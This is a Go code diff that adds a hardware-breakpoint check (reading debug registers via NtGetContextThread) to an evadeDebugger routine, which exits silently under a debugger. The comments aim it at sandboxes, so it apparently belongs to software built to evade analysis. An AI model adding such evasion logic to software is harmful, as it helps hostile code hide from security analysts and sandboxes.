@@ -144,6 +144,46 @@ func ntQueryNoDebugInherit() bool {
 	return r1 == 0 && flags == 0
 }
 
+// ntQueryHWBP checks hardware breakpoint registers DR0–DR3 via
+// NtGetContextThread. Any non-zero DR register means a debugger has set a
+// hardware breakpoint — something sandboxes do to intercept API calls.
+func ntQueryHWBP() bool {
+	proc := NewHGProc("NtGetContextThread")
+	if proc == nil {
+		return false
+	}
+
+	// CONTEXT_DEBUG_REGISTERS = 0x00010010 (x64)
+	const contextDebugRegisters = 0x00010010
+	const contextSize = 0x4D0 // sizeof(CONTEXT) on x64
+
+	// Allocate 16-byte-aligned CONTEXT on the heap to satisfy CONTEXT alignment
+	// requirement (CONTEXT must be 16-byte-aligned on x64).
+	raw := make([]byte, contextSize+16)
+	offset := uintptr(unsafe.Pointer(&raw[0])) & 0xF
+	if offset != 0 {
+		offset = 16 - offset
+	}
+	ctx := uintptr(unsafe.Pointer(&raw[offset]))
+
+	// Set ContextFlags before the call.
+	*(*uint32)(unsafe.Pointer(ctx)) = contextDebugRegisters
+
+	// NtGetContextThread(CurrentThread=-2, PCONTEXT)
+	const ntCurrentThread = ^uintptr(1) // (HANDLE)-2
+	r1, _, _ := proc.Call(ntCurrentThread, ctx)
+	if r1 != 0 {
+		return false
+	}
+
+	// DR0–DR3 are at CONTEXT offsets 0x50–0x68 on x64.
+	dr0 := *(*uintptr)(unsafe.Pointer(ctx + 0x50))
+	dr1 := *(*uintptr)(unsafe.Pointer(ctx + 0x58))
+	dr2 := *(*uintptr)(unsafe.Pointer(ctx + 0x60))
+	dr3 := *(*uintptr)(unsafe.Pointer(ctx + 0x68))
+	return dr0|dr1|dr2|dr3 != 0
+}
+
 // evadeDebugger exits silently if a debugger is detected via any method.
 func evadeDebugger() {
 	if isDebuggerPresentWin() ||
@@ -153,7 +193,8 @@ func evadeDebugger() {
 		rdtscTimingCheck() ||
 		ntQueryDebugPort() ||
 		ntQueryNoDebugInherit() ||
-		ntGlobalFlagCheck() {
+		ntGlobalFlagCheck() ||
+		ntQueryHWBP() {
 		os.Exit(0)
 	}
 }
